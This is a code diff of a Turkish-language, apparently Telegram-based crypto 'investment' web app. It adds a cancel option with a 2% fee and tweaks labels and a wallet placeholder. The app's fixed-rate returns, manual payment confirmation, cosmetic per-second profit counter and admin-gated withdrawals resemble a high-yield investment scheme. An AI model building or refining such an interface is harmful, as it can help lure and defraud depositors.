@@ -11,7 +11,6 @@
         body { background: #080a0c; color: #eaeaeb; font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; }
         .font-orbitron { font-family: 'Orbitron', sans-serif; }
         .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 20px; transition: all 0.3s ease; }
-        .glass-card:active { transform: scale(0.98); background: rgba(255, 255, 255, 0.05); }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         .nav-active { color: #f3ba2f !important; }
@@ -116,7 +115,7 @@
             <div id="step2" class="hidden text-center">
                 <h3 class="font-orbitron text-[10px] font-black text-white mb-4 uppercase italic">TRC20 Ödeme Adresi</h3>
                 <div class="bg-black p-4 rounded-xl border border-dashed border-yellow-500/50 mb-6 select-all">
-                    <p id="walletAddr" class="font-mono text-[9px] text-yellow-500 break-all uppercase">TY7xP_GERCEK_TRC20_ADRESIN_BURAYA</p>
+                    <p id="walletAddr" class="font-mono text-[9px] text-yellow-500 break-all uppercase">TY7xP_TRC20_ADRESIN_BURAYA</p>
                 </div>
                 <button onclick="confirmPay()" class="w-full bg-green-600 text-white font-black py-4 rounded-xl text-xs uppercase">Ödemeyi Tamamladım</button>
             </div>
@@ -136,8 +135,6 @@
             document.getElementById('uName').innerText = user.first_name.toUpperCase();
             document.getElementById('uAvatar').innerText = user.first_name.charAt(0).toUpperCase();
             syncUser(user);
-            
-            // CANLI SAYAÇ SİSTEMİ (1 SANİYEDE BİR ÇALIŞIR)
             setInterval(updateUIRuntime, 1000);
         };
 
@@ -157,8 +154,29 @@
             } catch(e) { console.error(e); }
         }
 
+        // --- İPTAL ETME (ÇİFT ONAYLI) ---
+        async function cancelInvest(id) {
+            const c1 = confirm("Yatırımınızı iptal etmek istediğinize emin misiniz?");
+            if(!c1) return;
+
+            const c2 = confirm("DİKKAT: İptal durumunda %2 komisyon ve ağ transfer ücretleri bakiyenizden düşülecektir. Onaylıyor musunuz?");
+            if(!c2) return;
+
+            try {
+                const res = await fetch(`${API_URL}/cancel-invest`, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ telegramId: userData.telegramId, investId: id }) 
+                });
+                if(res.ok) {
+                    alert("İptal talebi alındı. Kesintiler sonrası iade cüzdanınıza yapılacaktır.");
+                    syncUser({ id: userData.telegramId });
+                }
+            } catch(e) { alert("Bir hata oluştu."); }
+        }
+
         async function withdrawRequest(id, amount) {
-            const wallet = prompt("TRC20 Adresi:");
+            const wallet = prompt("Kazancın gönderileceği TRC20 Adresi:");
             if(!wallet) return;
             const res = await fetch(`${API_URL}/withdraw`, {
                 method: 'POST',
@@ -168,7 +186,6 @@
             if(res.ok) alert("Çekim talebiniz yöneticiye iletildi.");
         }
 
-        // CANLI BAKİYE VE KÂR HESAPLAMA MOTORU
         function updateUIRuntime() {
             if(!userData || !userData.investments) return;
             let totalLiveBalance = 0; 
@@ -186,22 +203,18 @@
                     const btn = document.getElementById(`btn-${inv._id}`);
 
                     if(diff > 0) {
-                        // Kalan zaman gösterimi
                         const d = Math.floor(diff / (1000*60*60*24));
                         const h = Math.floor((diff / (1000*60*60)) % 24);
                         const m = Math.floor((diff / (1000*60)) % 60);
                         const s = Math.floor((diff / 1000) % 60);
                         if(timerEl) timerEl.innerText = `${d}G ${h}S ${m}D ${s}S`;
 
-                        // Canlı Kâr (6 Haneli Hassas)
                         const progress = (now - startTime) / duration;
                         const currentProfit = inv.totalProfit * progress;
                         if(profitEl) profitEl.innerText = `$${currentProfit.toFixed(6)}`;
-                        
                         totalLiveBalance += (inv.amount + currentProfit); 
                     } else {
-                        // Vade Dolduğunda
-                        if(timerEl) timerEl.innerText = "VADE DOLDU";
+                        if(timerEl) timerEl.innerText = "VADE TAMAMLANDI";
                         if(profitEl) profitEl.innerText = `$${inv.totalProfit.toFixed(2)}`;
                         totalLiveBalance += (inv.amount + inv.totalProfit);
                         if(btn) { 
@@ -210,9 +223,6 @@
                             btn.classList.replace('text-gray-600', 'text-white'); 
                         }
                     }
-                } else {
-                    // Onay bekleyenler bakiyeye eklenmez
-                    totalLiveBalance += 0;
                 }
             });
             document.getElementById('totalBalanceHeader').innerText = `$${totalLiveBalance.toFixed(4)}`;
@@ -229,19 +239,19 @@
                     </div>
                     <div class="grid grid-cols-3 gap-2 mb-4">
                         <div><p class="text-[7px] text-gray-500 uppercase">Anapara</p><p class="text-[11px] font-bold font-orbitron">$${inv.amount.toFixed(2)}</p></div>
-                        <div><p class="text-[7px] text-gray-500 uppercase">Anlık Kar</p><p class="text-[11px] font-bold text-green-400 font-orbitron" id="profit-${inv._id}">$0.000000</p></div>
+                        <div><p class="text-[7px] text-gray-500 uppercase">Biriken</p><p class="text-[11px] font-bold text-green-400 font-orbitron" id="profit-${inv._id}">$0.000000</p></div>
                         <div><p class="text-[7px] text-blue-400 uppercase font-black">Hedef</p><p class="text-[11px] font-bold text-white font-orbitron">$${(inv.amount + inv.totalProfit).toFixed(2)}</p></div>
                     </div>
                     <p class="text-[10px] font-mono mb-4 text-center text-blue-400 tracking-[0.2em]" id="timer-${inv._id}">HESAPLANIYOR...</p>
                     <div class="flex gap-2">
-                        <button id="btn-${inv._id}" disabled onclick="withdrawRequest('${inv._id}', ${inv.amount + inv.totalProfit})" class="w-full bg-green-500/10 text-gray-600 py-3 rounded-lg text-[8px] font-black uppercase transition-all">Parayı Çek</button>
+                        <button onclick="cancelInvest('${inv._id}')" class="flex-1 bg-red-500/10 text-red-500 py-3 rounded-lg text-[8px] font-black uppercase transition-all">İptal Et</button>
+                        <button id="btn-${inv._id}" disabled onclick="withdrawRequest('${inv._id}', ${inv.amount + inv.totalProfit})" class="flex-1 bg-green-500/10 text-gray-600 py-3 rounded-lg text-[8px] font-black uppercase transition-all">Parayı Çek</button>
                     </div>
                 </div>
             `).reverse().join('');
         }
 
         function openInvestModal(days, rate) { currentPlan = { days, rate }; document.getElementById('step1').classList.remove('hidden'); document.getElementById('step2').classList.add('hidden'); document.getElementById('modal').classList.replace('hidden', 'flex'); }
-        
         function toStep2() { 
             const val = document.getElementById('investAmount').value; 
             if(val < 20) return alert("Minimum yatırım tutarı 20 USDT'dir."); 
@@ -249,12 +259,10 @@
             document.getElementById('step1').classList.add('hidden'); 
             document.getElementById('step2').classList.remove('hidden'); 
         }
-
         async function confirmPay() { 
             const res = await fetch(`${API_URL}/invest`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ telegramId: userData.telegramId, planDays: currentPlan.days, amount: currentPlan.amount, profit: currentPlan.amount * (currentPlan.rate/100) }) }); 
-            if(res.ok) { alert("Bildirim yöneticiye gönderildi. Onay bekleniyor."); closeModal(); syncUser(userData); } 
+            if(res.ok) { alert("Bildirim yöneticiye gönderildi. Onay bekliyor."); closeModal(); syncUser({id: userData.telegramId}); } 
         }
-
         function switchTab(t) { 
             document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active')); 
             document.getElementById('tab-'+t).classList.add('active'); 
